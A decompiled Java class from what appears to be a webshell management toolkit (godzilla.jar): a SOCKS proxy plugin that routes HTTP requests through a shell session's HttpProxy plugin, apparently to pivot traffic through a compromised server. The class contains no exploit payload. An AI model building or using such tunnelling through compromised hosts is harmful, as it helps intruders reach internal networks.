/*    */ package shells.plugins.java;
/*    */ 
/*    */ import com.httpProxy.server.request.HttpRequest;
/*    */ import com.httpProxy.server.response.HttpResponse;
/*    */ import core.annotation.PluginAnnotation;
/*    */ import core.imp.Plugin;
/*    */ import core.shell.ShellEntity;
/*    */ import core.socksServer.HttpRequestHandle;
/*    */ import core.ui.component.dialog.GOptionPane;
/*    */ import javax.swing.JPanel;
/*    */ import shells.plugins.generic.HttpProxy;
/*    */ import shells.plugins.generic.SocksProxy;
/*    */ 
/*    */ @PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "SocksProxy", DisplayName = "Socks代理")
/*    */ public class JSocksProxy
/*    */   extends SocksProxy implements HttpRequestHandle {
/*    */   ShellEntity shellEntity;
/*    */   HttpProxy httpProxy;
/*    */   
/*    */   public JSocksProxy() {
/* 21 */     super(null);
/*    */   }
/*    */ 
/*    */   
/*    */   public HttpResponse sendHttpRequest(HttpRequest httpRequest) {
/* 26 */     this.httpProxy.load();
/* 27 */     return this.httpProxy.sendHttpRequest(httpRequest);
/*    */   }
/*    */ 
/*    */   
/*    */   public void init(ShellEntity shellEntity) {
/* 32 */     super.init(shellEntity);
/* 33 */     this.shellEntity = shellEntity;
/* 34 */     Plugin plugin = this.shellEntity.getFrame().getPlugin("HttpProxy");
/* 35 */     if (plugin != null) {
/* 36 */       this.httpProxy = (HttpProxy)plugin;
/* 37 */       setHttpRequestHandle(this);
/*    */     } else {
/* 39 */       GOptionPane.showMessageDialog(super.getView(), "未找到HttpProxy插件!", "提示", 0);
/*    */     } 
/*    */   }
/*    */ 
/*    */   
/*    */   public JPanel getView() {
/* 45 */     return super.getView();
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\java\JSocksProxy.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */